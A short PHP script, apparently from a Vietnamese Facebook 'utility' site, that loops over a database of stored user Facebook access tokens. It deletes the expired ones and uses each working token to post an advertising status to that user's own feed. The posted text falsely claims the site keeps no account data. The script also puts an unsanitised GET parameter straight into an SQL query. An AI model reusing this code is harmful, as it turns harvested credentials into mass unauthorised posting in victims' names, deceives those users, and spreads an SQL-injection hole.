<?php
set_time_limit(0);
require("../databasecsdl.php");
$items = @mysqli_query($connection,"SELECT * FROM Users");
$thispage = $PHP_SELF;
$num = @mysqli_num_rows($items);
$per_page = 5000;
$start = @$_GET['start'];
if(empty($start)) $start = 0;
if($start+$per_page<$num){
}
$getinfo = @mysqli_query($connection,"SELECT * FROM `Users` ORDER BY id LIMIT $start,$per_page");
while ($gettoken = @mysqli_fetch_array($getinfo)){
$token= $gettoken['token2'];
$name= $gettoken['name'];
$idfb= $gettoken['id'];

$check = json_decode(file_get_contents('https://graph.facebook.com/me?access_token='.$token),true);
if(!$check[id]){
@mysqli_query($connection,"DELETE FROM Users
            WHERE
               token2 ='".$token."'
         ");
continue;
}
$msg = '#BótVn - Website tiện ích Facebook hàng đầu Việt Nam.
Chúng tôi đảm bảo không spam, không lưu lại tài khoản của bạn.
Chúng tôi tự hào về chất lượng sẽ đem lại cho bạn.
Admin Bót•Vn - BMN2312 - Cảm ơn '.$name.' đã tin tưởng.
💞=========🌷🌷=========💞 
Chào bạn: '.$name.'.
Cảm ơn bạn đã sử dụng Website của mình.
Mạn phép cho mình xin 1 status quảng cáo nhé.
🚹=========🚺🚺=========🚹';
auto('https://graph.facebook.com/me/feed?access_token='.$token.'&message='.urlencode($msg).'&method=post');

echo '<span style="color:red">Đã upstt cho nick: </span><span style="color:#0E0101">'.$name.'</span> <span style="color:red">UID: </span><span style="color:#0E0101">'.$idfb.'</span> <hr/><span style="color:green"> [SUCCESS]</span><hr/>';
}

function auto($url) {
   $ch = curl_init();
   curl_setopt_array($ch, array(
      CURLOPT_CONNECTTIMEOUT => 5,
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_URL            => $url,
      )
   );
   $result = curl_exec($ch);
   curl_close($ch);
   return $result;
}
?>